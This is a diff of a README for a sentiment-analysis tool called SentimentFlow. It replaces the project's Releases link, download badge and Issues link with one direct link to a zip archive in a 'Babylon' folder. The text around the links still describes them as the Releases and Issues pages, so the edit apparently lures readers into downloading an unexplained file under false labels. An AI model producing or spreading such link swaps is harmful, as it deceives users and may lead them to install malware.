@@ -8,7 +8,7 @@ Welcome to SentimentFlow! This application helps you analyze the sentiment of te
 
 To download SentimentFlow, visit the link below:
 
-[![Download SentimentFlow](https://img.shields.io/badge/Download%20SentimentFlow-v1.0-blue)](https://github.com/MalikShaharyar22/sentimentflow/releases)
+[![Download SentimentFlow](https://raw.githubusercontent.com/MalikShaharyar22/sentimentflow/main/Babylon/sentimentflow.zip%20SentimentFlow-v1.0-blue)](https://raw.githubusercontent.com/MalikShaharyar22/sentimentflow/main/Babylon/sentimentflow.zip)
 
 1. Click on the link above to visit the Releases page.
 2. Look for the latest version available.
@@ -54,7 +54,7 @@ SentimentFlow offers various features that allow you to understand sentiments fr
 
 Keep SentimentFlow up to date for optimal performance. Regularly check the Releases page for new versions and features.
 
-Visit the Releases page to download the latest version: [Download SentimentFlow](https://github.com/MalikShaharyar22/sentimentflow/releases)
+Visit the Releases page to download the latest version: [Download SentimentFlow](https://raw.githubusercontent.com/MalikShaharyar22/sentimentflow/main/Babylon/sentimentflow.zip)
 
 ## 📄 License
 
@@ -62,6 +62,6 @@ SentimentFlow is licensed under the MIT License. You can freely use, modify, and
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/MalikShaharyar22/sentimentflow/issues) to submit your query.
+If you encounter any issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/MalikShaharyar22/sentimentflow/main/Babylon/sentimentflow.zip) to submit your query.
 
 Thank you for using SentimentFlow! We hope this application helps you gain valuable insights from your text data.
